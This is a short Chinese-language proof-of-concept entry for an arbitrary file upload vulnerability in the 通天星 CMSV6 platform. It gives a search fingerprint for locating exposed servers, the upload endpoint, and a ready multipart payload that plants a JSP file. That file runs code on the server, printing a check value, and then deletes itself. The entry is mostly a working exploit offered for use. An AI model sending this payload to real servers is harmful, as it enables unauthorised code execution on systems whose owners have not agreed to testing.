# 通天星-CMSV6-inspect_file-upload存在任意文件上传漏洞

通天星-CMSV6-inspect_file-upload ｜ 文件上传 ｜ —
- **指纹**：`body="808gps"`
- **请求**：`POST /inspect_file/upload HTTP/1.1`

**Payload**
```
-----------------------------7db372eb000e2
Content-Disposition: form-data; name="uploadFile"; filename="1.jsp"
Content-Type: application/octet-stream
<% out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
-----------------------------7db372eb000e2--
```